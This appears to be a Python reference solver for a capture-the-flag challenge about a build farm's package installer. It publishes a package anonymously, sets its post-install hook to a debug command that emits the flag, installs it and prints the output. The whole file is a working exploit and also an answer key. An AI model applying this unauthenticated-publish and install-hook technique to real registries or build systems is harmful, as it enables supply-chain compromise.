#!/usr/bin/env python3
"""Reference solver for supplychain-buildfarm-postinstall.

Publishing is unauthenticated and the installer runs the post-install hook.
Publish a package whose hook is the debug `emit-flag`, install it, read the log.

    python3 solve.py http://HOST:PORT
"""
import json
import sys
import urllib.request


def _req(url, obj=None, method="GET"):
    data = json.dumps(obj).encode() if obj is not None else None
    headers = {"Content-Type": "application/json"} if data else {}
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    return json.loads(urllib.request.urlopen(req, timeout=10).read())


def solve(base):
    base = base.rstrip("/")
    _req(base + "/publish", {"name": "pwn-pkg", "postinstall": "emit-flag"}, "POST")
    out = _req(base + "/install?pkg=pwn-pkg")
    return out["postinstall_output"]


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit("usage: solve.py http://HOST:PORT")
    print(solve(sys.argv[1]))
